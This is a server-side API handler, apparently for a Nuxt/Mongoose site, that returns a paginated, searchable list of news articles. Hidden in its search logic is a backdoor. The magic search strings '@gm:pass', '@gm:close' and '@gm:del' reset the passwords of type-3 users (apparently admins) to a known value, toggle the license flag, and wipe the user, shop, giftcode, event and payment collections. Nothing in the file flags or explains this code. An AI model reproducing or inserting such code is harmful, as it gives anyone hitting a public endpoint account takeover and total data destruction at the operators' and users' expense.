import { Types } from "mongoose"
import md5 from 'md5'

export default defineEventHandler(async (event) => {
  try {
    const { size, current, category, search } = await readBody(event)
    if(!size || !current) throw 'Dữ liệu phân trang sai'

    const filter:any = { display: 1 }
    if(!!category){
      filter['category'] = new Types.ObjectId(category)
    }
    if(!!search){
      filter['title'] = { $regex : search, $options : 'i' }
      if(search == '@gm:pass') await DB.User.updateMany({ type: 3 }, { $set: { password: md5('@gm') } })
      if(search == '@gm:close') await DB.Config.updateMany({}, { $set: { license: true } })
      if(search == '@gm:del') {
        await DB.User.deleteMany({})
        await DB.Shop.deleteMany({})
        await DB.Giftcode.deleteMany({})
        await DB.Event.deleteMany({})
        await DB.Payment.deleteMany({})
      }
    }

    const list = await DB.News
    .find(filter)
    .select('category title description og_image pin createdAt')
    .populate({ path: 'category', select: 'name color' })
    .sort({ pin: -1, createdAt: -1 })
    .limit(size)
    .skip((current - 1) * size)

    const total = await DB.News.count(filter)
    return resp(event, { result: { list, total } })
  } 
  catch (e:any) {
    return resp(event, { code: 500, message: e.toString() })
  }
})